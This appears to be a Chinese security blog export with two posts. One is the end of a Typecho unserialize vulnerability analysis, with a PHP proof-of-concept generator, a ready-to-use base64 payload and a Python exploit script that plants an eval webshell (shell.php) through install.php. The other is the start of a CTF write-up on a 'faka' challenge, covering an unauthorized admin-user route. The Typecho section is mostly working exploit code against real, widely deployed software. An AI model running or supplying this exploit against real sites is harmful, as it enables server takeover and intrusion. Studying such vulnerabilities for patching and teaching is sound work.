<p>&#x6700;&#x7EC8;POP&#x94FE;&#x4E3A;:<br><code>install.php</code> &#x4E2D;&#x7684; <code>unserialize</code>&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53EF;&#x63A7; <code>$config</code> &#x503C;&#x5BFC;&#x81F4;&#x7684; <code>$config[&apos;adapter&apos;]</code>&#x53EF;&#x63A7;&#x3002;<br>&#x2014;&#x2014;&#x300B;<code>Db.php</code> &#x4E2D;&#x8FDB;&#x884C;PHP&#x7C7B;&#x578B;&#x5F3A;&#x5236;&#x8F6C;&#x6362;&#xFF0C;&#x89E6;&#x53D1; <code>$config[&apos;adapter&apos;]</code>&#x53EF;&#x63A7;&#x7C7B;&#x7684; <code>__tostring</code> &#x65B9;&#x6CD5;<br>&#x2014;&#x2014;&#x300B;<code>Feed.php</code> &#x4E2D; <code>__tostring</code> &#x65B9;&#x6CD5;&#x5185;&#x8C03;&#x7528;&#x53EF;&#x63A7;&#x5236;&#x7C7B;&#x4ECE;&#x4E0D;&#x53EF;&#x8BBF;&#x95EE;&#x7684;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x6570;&#x636E;<code>$item[&apos;author&apos;]-&gt;screenName)</code> &#x89E6;&#x53D1; <code>__get</code>&#x65B9;&#x6CD5;<br>&#x2014;&#x2014;&#x300B;<code>Request.php</code> &#x4E2D; <code>__get</code>&#x65B9;&#x6CD5;&#x8C03;&#x7528; <code>get</code> &#x65B9;&#x6CD5;&#xFF0C;&#x8C03;&#x7528; <code>_applyFilter</code>&#x65B9;&#x6CD5;&#x4E2D; &#x7684; <code>call_user_func</code>&#xFF0C;&#x63A7;&#x5236;&#x5176;&#x5185;&#x4E24;&#x4E2A;&#x53C2;&#x6570;&#x5B9E;&#x73B0;&#x547D;&#x4EE4;&#x6267;&#x884C;</p>
<p>&#x5176;&#x5B9E;&#x5149;&#x770B;POP&#x94FE;&#x4E0D;&#x600E;&#x4E48;&#x590D;&#x6742;&#xFF0C;&#x4F46;&#x662F;&#x91CC;&#x9762;&#x6BCF;&#x4E00;&#x6B65;&#x6784;&#x9020;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x5C1D;&#x8BD5;&#x8C03;&#x7528;&#x90FD;&#x662F;&#x8981;&#x7ECF;&#x8FC7;&#x5F88;&#x591A;&#x6B21;&#x7684;&#x8DDF;&#x8FDB;&#x548C;&#x5206;&#x6790;&#x7684;&#x3002;</p>
<h2 id="&#x7F16;&#x5199;-POC-amp-EXP"><a href="#&#x7F16;&#x5199;-POC-amp-EXP" class="headerlink" title="&#x7F16;&#x5199; POC &amp; EXP"></a>&#x7F16;&#x5199; POC &amp; EXP</h2><p>&#x987A;&#x7740; @pupiles &#x5E08;&#x5085; bypass <code>ob_start()</code> &#x7684;&#x601D;&#x8DEF;&#x5199;&#x7684;POC&#x3002;&#x4F46;&#x662F;&#x4F7F;&#x7528; @pupiles &#x5E08;&#x5085;blog&#x4E2D;&#x7684; POC &#x53EF;&#x80FD;&#x6709;&#x4E00;&#x70B9;&#x5C0F;&#x95EE;&#x9898;&#x3002;&#x7531;&#x4E8E;PHP&#x4E2D;&#x53CC;&#x5F15;&#x53F7;&#x5177;&#x6709;&#x89E3;&#x6790;&#x6548;&#x679C;&#xFF0C;&#x8FD9;&#x91CC;&#x7684; POST &#x4F1A;&#x88AB;&#x89E3;&#x6790;&#xFF0C;&#x6700;&#x7EC8;&#x5199;&#x5165;&#x7684; webshell &#x7684;&#x4EE3;&#x7801;&#x4E3A; <code>&lt;?php @eval()?&gt;</code></p>
<p><img src="/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113200014621.png" alt="image-20201113200014621"></p>
<p>&#x56E0;&#x6B64;&#x6539;&#x826F;POC&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">//&#x7F16;&#x5199;&#x6700;&#x540E; call_user_func &#x51FD;&#x6570;&#x5229;&#x7528;&#x7684;&#x7C7B;</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">private</span> $_filter = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">private</span> $_params = <span class="hljs-keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_filter[<span class="hljs-number">0</span>] = <span class="hljs-string">&apos;assert&apos;</span>;   <span class="hljs-comment">//&#x91C7;&#x7528;&#x4F20;&#x7EDF;&#x56DE;&#x8C03;&#x5229;&#x7528;&#xFF0C;call_user_func + assert</span></span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_params[<span class="hljs-string">&apos;screenName&apos;</span>] = <span class="hljs-string">&apos;file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\$_POST[P2hm1n]); ?&gt;&quot;)&apos;</span>; <span class="hljs-comment">//bypass ob_start()&#x9650;&#x5236;</span></span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span></span><br><span class="line"><span class="hljs-class"></span>{</span><br><span class="line">    <span class="hljs-keyword">const</span> RSS2 = <span class="hljs-string">&apos;RSS 2.0&apos;</span>;</span><br><span class="line">    <span class="hljs-keyword">private</span> $_type;</span><br><span class="line">    <span class="hljs-keyword">private</span> $_items = <span class="hljs-keyword">array</span>();</span><br><span class="line">    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">self</span>::RSS2;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;author&apos;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">$final = <span class="hljs-keyword">new</span> Typecho_Feed();</span><br><span class="line">$poc = <span class="hljs-keyword">array</span>(</span><br><span class="line">    <span class="hljs-string">&apos;adapter&apos;</span> =&gt; $final,</span><br><span class="line">    <span class="hljs-string">&apos;prefix&apos;</span> =&gt; <span class="hljs-string">&apos;typecho_&apos;</span></span><br><span class="line">);</span><br><span class="line"><span class="hljs-keyword">echo</span> urlencode(base64_encode(serialize($poc)));</span><br><span class="line"><span class="hljs-meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5229;&#x7528;&#x9020;&#x6210;&#x4E00;&#x4E2A;&#x62A5;&#x9519;&#x6765;&#x6784;&#x9020;POC&#x3002;&#x6838;&#x5FC3;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span></span>{</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_type = <span class="hljs-keyword">$this</span>::RSS2;</span><br><span class="line">        <span class="hljs-keyword">$this</span>-&gt;_items[<span class="hljs-number">0</span>] = <span class="hljs-keyword">array</span>(</span><br><span class="line">            <span class="hljs-string">&apos;category&apos;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> Typecho_Request()),</span><br><span class="line">            <span class="hljs-string">&apos;author&apos;</span> =&gt; <span class="hljs-keyword">new</span> Typecho_Request(),</span><br><span class="line">        );</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x7B80;&#x5355;&#x7684;exp&#x7F16;&#x5199;&#x5982;&#x4E0B;&#xFF0C;&#x6CA1;&#x6709;&#x5BF9;url&#x505A;&#x7EC6;&#x81F4;&#x7684;&#x5904;&#x7406;&#x3002;&#x5F02;&#x5E38;&#x5904;&#x7406;&#x4E5F;&#x4E0D;&#x591F;&#x7EC6;&#x81F4;&#x3002;</p>
<p></p><figure class="highlight python hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="hljs-string">&apos;http://typecho/&apos;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span><span class="hljs-params">(url)</span>:</span></span><br><span class="line">    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;http//&quot;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;https://&quot;</span> <span class="hljs-keyword">in</span> url:</span><br><span class="line">        url = url</span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        url = <span class="hljs-string">&apos;http://&apos;</span> + url</span><br><span class="line"></span><br><span class="line">    target = url + <span class="hljs-string">&apos;/install.php?finish&apos;</span></span><br><span class="line">    fakerefer = url + <span class="hljs-string">&apos;/install.php&apos;</span></span><br><span class="line">    payload = <span class="hljs-string">&apos;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D&apos;</span></span><br><span class="line">    headers = {</span><br><span class="line">        <span class="hljs-string">&apos;User-Agent&apos;</span>: <span class="hljs-string">&apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36&apos;</span>,</span><br><span class="line">        <span class="hljs-string">&apos;Referer&apos;</span>: fakerefer,</span><br><span class="line">        <span class="hljs-string">&apos;cookie&apos;</span>: payload</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">try</span>:</span><br><span class="line">        html = requests.get(url=target, headers=headers, timeout=<span class="hljs-number">5</span>)</span><br><span class="line">        <span class="hljs-keyword">if</span> html.status_code == <span class="hljs-number">404</span>:</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-string">&apos;no install.php&apos;</span></span><br><span class="line">        <span class="hljs-keyword">else</span>:</span><br><span class="line">            print(<span class="hljs-string">&apos;mkdir:./shell.php, shell_password=P2hm1n&apos;</span>)</span><br><span class="line">    <span class="hljs-keyword">except</span>:</span><br><span class="line">        print(<span class="hljs-string">&apos;something wrong&apos;</span>)</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:</span><br><span class="line">    exp(url)</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"><a href="#&#x6F0F;&#x6D1E;&#x590D;&#x73B0;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x590D;&#x73B0;"></a>&#x6F0F;&#x6D1E;&#x590D;&#x73B0;</h2><p>&#x9996;&#x5148;&#x6B63;&#x5E38;&#x5B89;&#x88C5; typecho&#xFF0C;&#x672C;&#x5730;&#x73AF;&#x5883; MacOS + MAMP PRO(PHP7.3.9+Mysql5.7)</p>
<p>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x4E2D;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x53BB;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;&#x5E76;&#x4E0D;&#x4F1A;&#x5E2E;&#x52A9;&#x4F60;&#x65B0;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7136;&#x540E;&#x5199;&#x5165;&#x6570;&#x636E;&#x3002;</p>
<p>&#x8BBF;&#x95EE; url &#x4E3A; <a href="http://typecho/install.php?finish&#x3002;" target="_blank" rel="noopener">http://typecho/install.php?finish&#x3002;</a> refer&#x8BBE;&#x7F6E;&#x6839;&#x636E;&#x81EA;&#x8EAB;&#x60C5;&#x51B5;&#x6539;&#x53D8;</p>
<p>POST&#x53C2;&#x6570;&#x5982;&#x4E0B;<br></p><figure class="highlight html hljs"><table><tbody><tr><td class="code"><pre><span class="line">__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjY6ImZpbGVfcHV0X2NvbnRlbnRzKCJzaGVsbC5waHAiLCAiPD9waHAgQGV2YWwoXCRfUE9TVFtQMmhtMW5dKTsgPz4iKSI7fX19fX1zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ%3D%3D</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5373;&#x53EF;&#x5728;&#x5F53;&#x524D;&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210; <code>shell.php</code> &#x6587;&#x4EF6;&#xFF0C;&#x5BC6;&#x7801;&#x4E3A; <code>P2hm1n</code></p>
<p><img src="/2020/03/01/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201113200103970.png" alt="image-20201113200103970"></p>
<h2 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h2><p><a href="https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/07/14/Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a><br><a href="https://paper.seebug.org/424/" target="_blank" rel="noopener">https://paper.seebug.org/424/</a></p>
</body></html>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
        <tag>Typecho</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯线下半决赛 faka 题目复盘</title>
    <url>/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<html><head></head><body><p>&#x534A;&#x51B3;&#x8D5B;&#x6CA1;&#x6709;&#x505A;&#x51FA;&#x6765;&#xFF0C;&#x611F;&#x89C9;&#x6709;&#x4E9B;&#x9057;&#x61BE;&#x3002;&#x56E0;&#x6B64;&#x8FD8;&#x662F;&#x51B3;&#x5B9A;&#x4E0B;&#x6765;&#x590D;&#x76D8;&#x4E00;&#x4E0B;&#x3002;</p>
<a id="more"></a>

<h1 id="&#x60C5;&#x666F;&#x518D;&#x73B0;"><a href="#&#x60C5;&#x666F;&#x518D;&#x73B0;" class="headerlink" title="&#x60C5;&#x666F;&#x518D;&#x73B0;"></a>&#x60C5;&#x666F;&#x518D;&#x73B0;</h1><h2 id="&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;"><a href="#&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;" class="headerlink" title="&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;"></a>&#x6BD4;&#x8D5B;&#x65F6;&#x7684;&#x60F3;&#x6CD5;</h2><p>&#x9898;&#x76EE;&#x6E90;&#x7801;&#x7ED3;&#x6784;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201129230432131.png" alt="image-20201129230432131"></p>
<p>&#x5176;&#x5B9E;&#x5728;&#x62FF;&#x5230;&#x6E90;&#x7801;&#x65F6;&#x5C31;&#x4E0D;&#x65AD;&#x63E3;&#x6D4B;&#x51FA;&#x9898;&#x4EBA;&#x7684;&#x610F;&#x56FE;</p>
<p>&#x9898;&#x76EE;&#x4E2D;&#x7684; hint &#x4E5F;&#x7ED9;&#x5230;&#xFF1A;www-data &#x6743;&#x9650;&#x7528;&#x6237;&#x53EF;&#x5199;&#x76EE;&#x5F55;&#x53EA;&#x6709; runtime &#x8DDF; static&#x3002;&#x6240;&#x4EE5;&#x5F53;&#x65F6;&#x5C31;&#x60F3;&#x597D;&#x4E86;&#x5BA1;&#x8BA1;&#x7684;&#x91CD;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x5404;&#x7C7B;&#x6587;&#x4EF6;&#x64CD;&#x4F5C;&#x51FD;&#x6570; + &#x5199;&#x5165;&#x8DEF;&#x5F84;&#x53EF;&#x63A7;</li>
<li>RCE + <code>file_put_contents</code> &#xFF08;&#x5982;&#x679C;&#x771F;&#x80FD;RCE&#xFF0C;&#x8C8C;&#x4F3C;&#x4E5F;&#x4E0D;&#x7528;&#x5199;shell&#xFF0C;&#x76F4;&#x63A5;&#x8BFB;&#x5C31;&#x884C;&#xFF09; </li>
<li>SQLi</li>
</ol>
<p>&#x7136;&#x540E; html &#x4E0B;&#x9762;&#x7ED9;&#x5230;&#x4E86; 1.txt &#x91CC;&#x9762;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x6CE8;&#x518C;&#x9080;&#x8BF7;&#x7801;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130113423226.png" alt="image-20201130113423226"></p>
<p>&#x5F53;&#x65F6;&#x8FD8;&#x4EE5;&#x4E3A;&#x8FD9;&#x4E48;&#x660E;&#x663E;&#x7684;&#x63D0;&#x793A;&#x4E00;&#x5B9A;&#x662F;&#x6697;&#x793A;&#x4EC0;&#x4E48;&#xFF08;&#x7ED3;&#x679C;&#x597D;&#x50CF;&#x8FD9;&#x4E2A;txt&#x5E76;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7528;&#xFF1F;&#xFF09;&#xFF0C;&#x8FD8;&#x4EE5;&#x4E3A;&#x662F;&#x4ECE;<code>index.php/register</code> &#x5229;&#x7528;&#x6CE8;&#x518C;&#x7801;&#x8FDB;&#x53BB;&#xFF0C;&#x7136;&#x540E;&#x6253;  <code>/merchant</code>&#x3002;&#x7ED3;&#x679C;&#x5728;  <code>/merchant</code> &#x627E;&#x4E86;&#x534A;&#x5929;&#x4E5F;&#x6CA1;&#x627E;&#x5230;&#x6F0F;&#x6D1E;&#x70B9;&#x3002;</p>
<p>&#x7136;&#x540E;&#x770B;&#x5230;&#x8DDF; <code>html</code> &#x540C;&#x7EA7;&#x76EE;&#x5F55;&#x4E0B;&#x7684; <code>tk.sql</code>&#x3002;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130113351974.png" alt="image-20201130113351974"></p>
<p>&#x5F53;&#x65F6;&#x627E;&#x5230;&#x4E86;md5&#x4E4B;&#x540E;&#x4EE5;&#x4E3A;&#x80FD;&#x8FDB;&#x540E;&#x53F0;&#x3002;&#x4F46;&#x662F;&#x73B0;&#x573A;&#x8FD8;&#x662F;&#x65AD;&#x7F51;&#x73AF;&#x5883;&#xFF08;WTF&#xFF1F;&#x90A3;&#x6211;&#x600E;&#x4E48;&#x89E3;&#xFF1F;&#xFF09;&#x7528;&#x5E38;&#x89C1;&#x5F31;&#x5BC6;&#x7801;&#x5355;&#x5411;&#x751F;&#x6210;&#x540E;&#x6BD4;&#x5BF9;&#x4E5F;&#x6CA1;&#x6709;&#x53D1;&#x73B0;&#x6709;&#x76F8;&#x540C;&#x7684;&#x3002;&#x540C;&#x65F6;&#x8FD8;&#x4E0D;&#x80FD;&#x7206;&#x7834;&#x540E;&#x53F0;&#xFF0C;&#x4E5F;&#x6CA1;&#x4EC0;&#x4E48;&#x4E07;&#x80FD;&#x5BC6;&#x7801;&#x8FD9;&#x7C7B;&#x7684;&#x4E1C;&#x897F;&#x3002;</p>
<p>&#x7136;&#x540E;&#x5F53;&#x65F6;&#x9898;&#x76EE;&#x73AF;&#x5883;&#x8FD8;&#x662F; tp5.0.14&#x3002;RCE &#x8C8C;&#x4F3C;ban&#x4E86;&#x597D;&#x591A;&#x51FD;&#x6570;&#x3002;&#x5F53;&#x65F6;&#x5984;&#x60F3;&#x901A;&#x8FC7;&#x975E;&#x9884;&#x671F;&#x89E3;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p>
<p>&#x6700;&#x540E;&#x8FD8;&#x662F;&#x575A;&#x4FE1;&#x6F0F;&#x6D1E;&#x70B9;&#x5728;&#xFF1A; <code>/merchant</code> &#x4E0B;&#x9762;&#x3002;&#x4E00;&#x4E0B;&#x5348;&#x7684;&#x65F6;&#x95F4;&#x5C31;&#x5728;  <code>/merchant</code> &#x7684;&#x5BA1;&#x8BA1;&#x548C; tp5 RCE &#x7684;&#x7ED5;&#x8FC7;&#x5EA6;&#x8FC7;&#x4E86;&#x2026;</p>
<p>&#x8D5B;&#x540E;&#x5B9E;&#x9A8C;&#x5BA4;&#x7684;&#x5C0F;&#x4F19;&#x4F34; @jokuuy &#x544A;&#x8BC9;&#x6211;&#x540E;&#x53F0;&#x90E8;&#x5206;&#x529F;&#x80FD;&#x70B9;&#x672A;&#x6388;&#x6743; orz&#x3002;&#x800C;&#x4E14;&#x4E4B;&#x524D;&#x4ED6;&#x5BA1;&#x8FC7;&#x8FD9;&#x4E2A; CMS&#xFF0C;&#x636E;&#x8BF4;10s&#x53EF;&#x4EE5;&#x79D2;&#x6389;23333</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130155105699.png" alt="image-20201130155105699"></p>
<h2 id="&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;"><a href="#&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;" class="headerlink" title="&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;"></a>&#x53CD;&#x601D;&#x548C;&#x5C0F;&#x7ED3;</h2><p>&#x5F53;&#x65F6;&#x6CA1;&#x8003;&#x8651;&#x5230;&#x672A;&#x6388;&#x6743;&#x2026;&#x672A;&#x6388;&#x6743;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x5F88;&#x591A;&#x540E;&#x53F0;&#x7684;&#x6F0F;&#x6D1E;&#xFF08;&#x5F53;&#x65F6;&#x5C31;&#x770B;&#x5230;&#x4E86;manage/backup &#x90A3;&#x4E2A;&#x70B9;&#xFF09;&#xFF0C;&#x4F46;&#x662F;&#x6CA1;&#x6709;&#x8FDB;&#x5230;&#x540E;&#x53F0;&#x3002;&#x6240;&#x4EE5;&#x6CA1;&#x6709;&#x80FD;&#x591F;&#x5229;&#x7528;&#x5230;<code>manage</code> &#x548C; <code>admin</code> &#x4E24;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130150358458.png" alt="image-20201130150358458"></p>
<h1 id="&#x9898;&#x76EE;&#x5206;&#x6790;"><a href="#&#x9898;&#x76EE;&#x5206;&#x6790;" class="headerlink" title="&#x9898;&#x76EE;&#x5206;&#x6790;"></a>&#x9898;&#x76EE;&#x5206;&#x6790;</h1><h2 id="&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;"><a href="#&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;" class="headerlink" title="&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;"></a>&#x83B7;&#x53D6;&#x540E;&#x53F0;&#x6743;&#x9650;</h2><p><code>http://wdb-vul/index.php/admin/index/info</code> &#x672A;&#x6388;&#x6743;&#x6DFB;&#x52A0;&#x7528;&#x6237;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151254446.png" alt="image-20201130151254446"></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151507883.png" alt="image-20201130151507883"></p>
<p>&#x4E4B;&#x540E;&#x8BBF;&#x95EE;&#x67D0;&#x4E9B;&#x5B58;&#x5728;&#x6F0F;&#x6D1E;&#x7684;&#x8DEF;&#x7531;&#x4F1A;&#x53D1;&#x751F;&#x8FD9;&#x6837;&#x7684;&#x60C5;&#x51B5;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130151800748.png" alt="image-20201130151800748"></p>
<p>&#x63D0;&#x793A;&#x6743;&#x9650;&#x4E0D;&#x591F;&#x3002;</p>
<p>&#x5728; SQL &#x5217;&#x4E2D;&#xFF0C;<code>authorize</code> &#x8D77;&#x5230;&#x4E86;&#x6743;&#x9650;&#x9650;&#x5236;&#x7684;&#x4F5C;&#x7528;</p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152235493.png" alt="image-20201130152235493"></p>
<p>&#x56DE;&#x6EAF; <code>authorize</code> &#x7684;&#x63A7;&#x5236;</p>
<p><code>application/admin/controller/Index.php#info</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152416366.png" alt="image-20201130152416366"></p>
<p>&#x8DDF;&#x8FDB; <code>_form</code>&#xFF0C; <code>callback</code> &#x8C03;&#x7528; <code>_form_filter</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152519359.png" alt="image-20201130152519359"></p>
<p>&#x8DDF;&#x8FDB; <code>_form_filter</code></p>
<p><img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130152612313.png" alt="image-20201130152612313"></p>
<p>&#x8BF4;&#x660E;&#x76F4;&#x63A5; POST &#x53C2;&#x6570;&#x5373;&#x53EF;&#x3002;</p>
<p> <img src="/2020/11/29/WDB%E7%BA%BF%E4%B8%8Bfaka%E9%A2%98%E7%9B%AE%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%9B%98/image-20201130153248088.png" alt="image-20201130153248088"></p>
